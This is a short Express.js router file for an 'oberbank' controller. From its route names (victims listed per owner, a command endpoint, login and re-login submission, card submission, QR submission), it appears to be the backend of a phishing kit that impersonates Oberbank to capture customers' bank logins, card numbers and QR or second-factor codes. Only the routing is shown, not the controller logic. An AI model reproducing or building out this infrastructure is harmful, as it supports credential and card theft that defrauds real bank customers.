const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitCard,
    submitQr,
    deleteEntry,
} = require("../controllers/oberbankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/cc", submitCard);
router.post("/qr", submitQr);
router.post("/delete", deleteEntry);

module.exports = router;
